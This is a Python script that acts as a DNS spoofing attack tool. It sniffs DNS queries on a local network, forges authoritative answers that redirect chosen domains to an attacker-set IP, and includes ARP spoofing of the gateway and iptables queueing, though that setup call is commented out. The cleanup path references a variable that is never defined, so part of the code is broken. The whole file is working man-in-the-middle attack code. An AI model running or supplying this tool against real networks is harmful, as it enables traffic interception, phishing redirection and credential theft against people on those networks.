import json
import time
import os
import subprocess
import netifaces
from scapy.all import *
from scapy.layers.dns import DNSQR, DNSRR, DNS
from scapy.layers.inet import IP, UDP

INTERFACE = "wlan0"

def load_config():
    """Load configuration from config.json"""
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        targets = [domain.lower().strip() for domain in config['target']]
        spoof_ip = config['ip_port']['ip']
        return targets, spoof_ip
    except Exception as e:
        print(f"Error loading config: {e}")
        exit(1)

def setup_arp_spoofing_and_iptables():
    global INTERFACE
    interface = input(f'Enter the network interface to use (default: {INTERFACE}): ') or INTERFACE

    try:
        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
        print(f"[*] Using default gateway: {gateway}")
    except KeyError:
        print("[-] Could not determine the network default gateway.")
        exit(1)


    if not gateway:
        print("[-] Network default gateway is required.")
        exit(1)

    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

    arpspoof_cmd = ["arpspoof", "-i", interface, gateway]
    arpspoof_process = subprocess.Popen(arpspoof_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return arpspoof_process


def dns_spoofer(target_domains, redirect_ip):
    """Handle DNS requests and send multiple spoofed responses"""
    def process_packet(packet):
        if packet.haslayer(DNSQR) and packet[DNS].opcode == 0 and packet[DNS].qr == 0:
            queried_domain = packet[DNSQR].qname.decode().rstrip('.').lower()
            
            if queried_domain in target_domains:
                print(f"[+] Spoofing DNS response for: {queried_domain}")
                
                # Craft spoofed DNS response
                spoofed_response = IP(
                    dst=packet[IP].src,
                    src=packet[IP].dst
                ) / UDP(
                    dport=packet[UDP].sport,
                    sport=packet[UDP].dport
                ) / DNS(
                    id=packet[DNS].id,
                    qr=1,
                    aa=1,
                    qd=packet[DNS].qd,
                    an=DNSRR(
                        rrname=packet[DNSQR].qname,
                        type="A",
                        ttl=600,
                        rdata=redirect_ip
                    )
                )
                
                # Send multiple responses quickly
                for _ in range(3):
                    send(spoofed_response, verbose=0)
                    time.sleep(0.01)
                
                print(f"[+] Sent 3 spoofed responses ({redirect_ip}) for {queried_domain}")
    
    return process_packet

def cleanup(arpspoof_process):
    """Cleanup function to revert changes"""
    print("\n[*] Cleaning up...")
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
    arpspoof_process.terminate()
    arpspoof_process.wait()
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')
    print("[*] Cleanup complete.")



def main():
    """Main function"""
    targets, spoof_ip = load_config()
    
    print("[*] Starting DNS spoofer...")
    print(f"[*] Monitoring for DNS queries: {', '.join(targets)}")
    print(f"[*] Redirecting to IP: {spoof_ip}")
    print("[*] Press Ctrl+C to stop\n")

    #arpspoof_process = setup_arp_spoofing_and_iptables()
    
    # Enable IP forwarding
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    
    try:
        sniff(
            filter="udp port 53",
            prn=dns_spoofer(targets, spoof_ip),
            store=0,
            iface=conf.iface
        )
    except KeyboardInterrupt:
        print("\n[*] Stopping DNS spoofer...")
        cleanup(arpspoof_process)
        # Disable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Use sudo.")
        exit(1)
    main()
